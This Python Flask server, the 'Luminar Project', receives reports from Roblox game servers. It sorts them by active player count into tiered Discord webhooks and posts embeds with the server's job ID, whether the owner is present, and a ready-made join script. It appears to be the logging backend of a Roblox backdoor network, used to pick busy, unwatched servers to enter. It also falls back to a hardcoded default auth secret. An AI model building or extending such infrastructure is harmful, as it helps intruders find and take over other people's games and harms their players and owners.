import os, hashlib, time, requests, logging
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("LuminarProject")

AUTH_SECRET = os.environ.get('AUTH_SECRET', 'Luminar')
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_50'),
    "tier2": os.environ.get('WEBHOOK_50_100'),
    "tier3": os.environ.get('WEBHOOK_100_500'),
    "tier4": os.environ.get('WEBHOOK_INFINITY')
}

def verify_luminar_security(provided_hash):
    current_min = time.gmtime().tm_min
    minutes = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    for m in minutes:
        expected = hashlib.sha256(f"{AUTH_SECRET}:{m}".encode()).hexdigest()
        if provided_hash == expected: return True
    return False

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')
    
    if not verify_luminar_security(provided_hash):
        return jsonify({"error": "Unauthorized"}), 401

    # Extract EVERYTHING from the Roblox payload
    p_id = data.get('placeId', 0)
    u_id = data.get('universeId', 0)
    j_id = data.get('jobId', 'N/A')
    active = data.get('totalActive', 0)
    
    # Routing
    if active >= 500: target = WEBHOOKS["tier4"]
    elif active >= 100: target = WEBHOOKS["tier3"]
    elif active >= 50: target = WEBHOOKS["tier2"]
    else: target = WEBHOOKS["tier1"]

    if not target: return jsonify({"error": "No webhook"}), 500

    # Quick fetch to extract the actual PNG URL from Roblox's JSON response
    icon_url = "https://i.imgur.com/8N7u7D6.png" # Safe fallback
    try:
        icon_req = requests.get(f"https://thumbnails.roproxy.com/v1/games/icons?universeIds={u_id}&size=256x256&format=Png", timeout=3).json()
        if icon_req.get("data") and len(icon_req["data"]) > 0:
            icon_url = icon_req["data"][0].get("imageUrl", icon_url)
    except:
        pass

    # Build the exact embed from image_3c46c4.png
    timestamp = datetime.utcnow().strftime('%d.%m.%Y %H:%M')
    
    payload = {
        "embeds": [{
            "author": {"name": "Luminar - Logs"},
            "title": "Game Log",
            "color": 0xAC00FF,
            "thumbnail": {"url": icon_url}, # Now sends a real image link
            "description": (
                "### Game Info ℹ️\n"
                f"🎮 Game: [{data.get('name')}](https://www.roblox.com/games/{p_id}/)\n"
                f"📄 PlaceId: `{p_id}`\n"
                f"👥 Total Active Players: {active:,}\n"
                f"👀 Visits: {data.get('visits', 0):,}\n\n"
                
                "### Server Info ✅\n"
                f"🧠 Server Players: {data.get('playerCount')}/{data.get('maxPlayers')}\n"
                f"👑 Owner Present: `{data.get('ownerPresent')}`\n"
                f"⏱️ Server Uptime: `{data.get('uptime')}`\n\n"
                
                "### Creation Information 🛠️\n"
                f"📅 Updated: `{data.get('updated')}`\n"
                f"⚒️ Created: `{data.get('created')}`\n"
                f"👑 Creator: `{data.get('creator')}`\n\n"
                
                "### Job ID Join Script\n"
                f"```js\nRoblox.GameLauncher.joinGameInstance({p_id}, '{j_id}')\n```"
            ),
            "footer": {"text": f"Luminar Project! | Full Data Sync • {timestamp}"}
        }]
    }

    requests.post(target, json=payload)
    return jsonify({"status": "Success"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
